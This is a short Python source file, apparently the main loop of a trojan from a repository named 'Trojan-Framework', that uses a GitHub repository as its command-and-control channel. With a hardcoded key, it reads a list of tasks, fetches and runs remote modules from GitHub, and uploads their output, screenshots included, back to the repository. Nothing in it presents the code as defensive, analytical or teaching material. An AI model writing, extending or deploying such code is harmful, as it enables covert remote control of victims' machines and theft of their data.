from cnc import *
from datetime import datetime

def main():
    github = GitHubActionScanner("Warre06/Trojan-Framework","secretkey")
    github.connect_to_repo()
    actions = github.scan_actions_file()
    config = github.get_config()
    print(config)
    print(f"actions to do : {actions}")
    for action in actions:
        print(action)
        for action in actions:
            try:
                if action in config:
                    module_name = config[action]["module"]
                    print(module_name)
                    class_name = config[action]["class"]
                    path = config[action]["path"]
                    output = github.execute_github_module(action, class_name,"main")
                    if action == "screenshot":
                        github.upload_data(output,f"data/screenshots/{str(datetime.now())}.png")
                    else:
                        github.upload_data(output,path)
            except Exception as e:
                print(f"Error executing action {action} : {e}")
                continue
            
        
if __name__ == "__main__":
    main()  
    





